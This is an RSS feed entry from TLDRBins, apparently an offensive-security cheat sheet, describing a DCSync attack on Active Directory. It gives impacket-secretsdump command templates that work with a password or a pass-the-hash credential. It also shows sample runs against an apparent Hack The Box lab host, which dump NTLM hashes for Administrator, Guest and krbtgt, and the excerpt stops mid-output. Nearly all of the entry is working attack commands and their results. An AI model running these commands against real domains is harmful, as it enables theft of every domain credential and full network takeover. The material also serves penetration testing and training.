channel.title: Getchanges on TLDRBins
channel.description: Recent content in Getchanges on TLDRBins

item.title: GetChanges/GetChangesAll
item.description: Abuse #1: DCSync Attack Linux Windows # With creds impacket-secretsdump -just-dc '<USER>:<PASSWORD>@<TARGET>' $ impacket-secretsdump -just-dc 'mrlky:Football#7@10.10.10.103' Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8::: ---[SNIP]--- [*] Cleaning up... # With hashes impacket-secretsdump -hashes :<HASH> -just-dc '<DOMAIN>/<USER>@<TARGET>' $ impacket-secretsdump -hashes :bceef4f6fe9c026d1d8dec8dce48adef -just-dc 'sizzle.htb/mrlky@10.10.10.103' Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.
